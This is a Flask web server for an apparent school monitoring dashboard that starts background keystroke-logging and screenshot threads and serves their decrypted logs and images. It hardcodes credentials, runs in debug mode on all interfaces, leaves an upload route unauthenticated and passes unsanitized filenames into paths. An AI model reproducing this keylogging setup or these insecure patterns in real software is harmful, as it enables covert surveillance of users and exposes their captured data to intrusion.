import json
from flask import Flask, render_template, request, session, jsonify, redirect, url_for, send_from_directory, send_file
from functools import wraps
from encryption import decrypt_data, set_decryption_key, decrypt_image
from keystroke_logger import start_logger
import os
import threading
from datetime import datetime
from visualization import generate_visualization
from screenshot import start_screenshot_capture

app = Flask(__name__, template_folder="../frontend/templates", static_folder="../frontend/static")
app.secret_key = "your_secret_key_here"  # Replace with a secure secret key
visualization_lock = threading.Lock()

# Define folder paths
LOGS_FOLDER = os.path.join("keylogger", "logs")
IMAGES_FOLDER = os.path.join("keylogger", "images")
SCREENSHOTS_FOLDER = os.path.join("keylogger", "screenshots")
METADATA_FILE = os.path.join("keylogger", "flagged_images_metadata.json")
LOGIN_LOGS_FILE = os.path.join("keylogger", "login_logs.json")
GRAPHS_FOLDER = os.path.join("keylogger", "graphs")

# Create necessary folders if they don't exist
for folder in [LOGS_FOLDER, IMAGES_FOLDER, SCREENSHOTS_FOLDER, GRAPHS_FOLDER]:
    if not os.path.exists(folder):
        os.makedirs(folder)
        print(f"Created folder at: {os.path.abspath(folder)}")

# Initialize metadata files
for file_path in [METADATA_FILE, LOGIN_LOGS_FILE]:
    if not os.path.exists(file_path):
        with open(file_path, "w") as f:
            json.dump([], f)
    else:
        try:
            with open(file_path, "r") as f:
                json.load(f)
        except json.JSONDecodeError:
            with open(file_path, "w") as f:
                json.dump([], f)

SECRET_CODES = {
    "Teacher":"Teacher123",
    "Principal": "Principal123"
}

# Authentication
def authenticate(username, password, role, secret_code):
    if username == "admin" and password == "password" and secret_code == SECRET_CODES.get(role):
        return True
    return False

def requires_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if "username" not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated

def log_login(username, role):
    login_entry = {
        "username": username,
        "role": role,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    }
    with open(LOGIN_LOGS_FILE, "r") as f:
        logs = json.load(f)
    logs.append(login_entry)
    with open(LOGIN_LOGS_FILE, "w") as f:
        json.dump(logs, f, indent=4)

# Image serving routes
@app.route("/images/<filename>")
def serve_image(filename):
    try:
        image_data = decrypt_image(os.path.join(IMAGES_FOLDER, filename), ':memory:')
        return send_file(image_data, mimetype='image/jpeg')
    except Exception as e:
        return str(e), 500

@app.route("/screenshots/<filename>")
def serve_screenshot(filename):
    try:
        image_data = decrypt_image(os.path.join(SCREENSHOTS_FOLDER, filename), ':memory:')
        return send_file(image_data, mimetype='image/png')
    except Exception as e:
        return str(e), 500

# Main routes
@app.route("/")
def index():
    return render_template("index.html")
@app.route("/check_role")
@requires_auth
def check_role():
    return jsonify({
        "role": session.get("role"),
        "username": session.get("username")
    })

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        data = request.get_json()
        username = data.get("username")
        password = data.get("password")
        role = data.get("role")
        secret_code = data.get("secret_code")

        if authenticate(username, password, role, secret_code):
            session["username"] = username
            session["role"] = role
            log_login(username, role)
            return jsonify({"message": "Login successful", "redirect": "/dashboard"})
        return jsonify({"message": "Invalid credentials"}), 401
    return render_template("login.html")

@app.route("/dashboard")
@requires_auth
def dashboard():
    with open(LOGIN_LOGS_FILE, "r") as f:
        login_logs = json.load(f)
    return render_template("dashboard.html", login_logs=login_logs)

# Data fetching routes
@app.route("/logs", methods=["POST"])
@requires_auth  
def get_logs():
    data = request.get_json()
    decryption_key = data.get("decryption_key")
    if not decryption_key:
        return jsonify({"message": "Decryption key is required"}), 400

    set_decryption_key(decryption_key)
    logs = []
    for filename in os.listdir(LOGS_FOLDER):
        file_path = os.path.join(LOGS_FOLDER, filename)
        if os.path.isfile(file_path):
            with open(file_path, "r") as file:
                encrypted_logs = file.readlines()
                for log in encrypted_logs:
                    decrypted_log = decrypt_data(log.strip())
                    logs.append({"filename": filename, "content": decrypted_log})
    return jsonify(logs)

@app.route("/flagged_images", methods=["POST"])
@requires_auth
def get_flagged_images():
    data = request.get_json()
    decryption_key = data.get("decryption_key")
    if not decryption_key:
        return jsonify({"message": "Decryption key is required"}), 400

    set_decryption_key(decryption_key)
    with open(METADATA_FILE, "r") as f:
        metadata = json.load(f)
    return jsonify(metadata)

@app.route("/screenshots", methods=["POST"])
@requires_auth
def get_screenshots():
    data = request.get_json()
    decryption_key = data.get("decryption_key")
    if not decryption_key:
        return jsonify({"message": "Decryption key is required"}), 400

    set_decryption_key(decryption_key)
    screenshots = [f for f in os.listdir(SCREENSHOTS_FOLDER) if f.endswith('.png.enc')]
    return jsonify(screenshots)

@app.route("/login_logs")
@requires_auth
def get_login_logs():
    try:
        with open(LOGIN_LOGS_FILE, "r") as f:
            login_logs = json.load(f)
        return jsonify(login_logs)
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route("/generate_visualization")
@requires_auth
def generate_visualization_route():
    with visualization_lock:
        graph_filename = generate_visualization(LOGS_FOLDER)
        if not graph_filename:
            return jsonify({"message": "No data available for visualization"}), 404
    return jsonify({"graph_filename": graph_filename})

@app.route("/graphs/<filename>")
def serve_graph(filename):
    return send_from_directory(GRAPHS_FOLDER, filename)

@app.route("/upload_flagged_image", methods=["POST"])
def upload_flagged_image():
    flagged_word = request.form.get("flagged_word")
    flagged_message = request.form.get("flagged_message")
    timestamp = request.form.get("timestamp")
    filename = request.form.get("filename")

    if not all([flagged_word, flagged_message, timestamp, filename]):
        return "Missing required fields", 400

    metadata = {
        "filename": filename,
        "flagged_word": flagged_word,
        "flagged_message": flagged_message,
        "timestamp": timestamp
    }
    
    with open(METADATA_FILE, "r") as f:
        data = json.load(f)
    data.append(metadata)
    with open(METADATA_FILE, "w") as f:
        json.dump(data, f)

    return "Image metadata saved successfully", 200

# Thread management
keylogger_started = False
screenshot_started = False

def start_keylogger():
    global keylogger_started
    if not keylogger_started:
        threading.Thread(target=start_logger, daemon=True).start()
        keylogger_started = True
        print("Keylogger thread started.")

def start_screenshot():
    global screenshot_started
    if not screenshot_started:
        threading.Thread(target=start_screenshot_capture, daemon=True).start()
        screenshot_started = True
        print("Screenshot thread started.")

if __name__ == "__main__":
    start_keylogger()
    start_screenshot()
    app.run(host="0.0.0.0", port=5000, debug=True, use_reloader=False)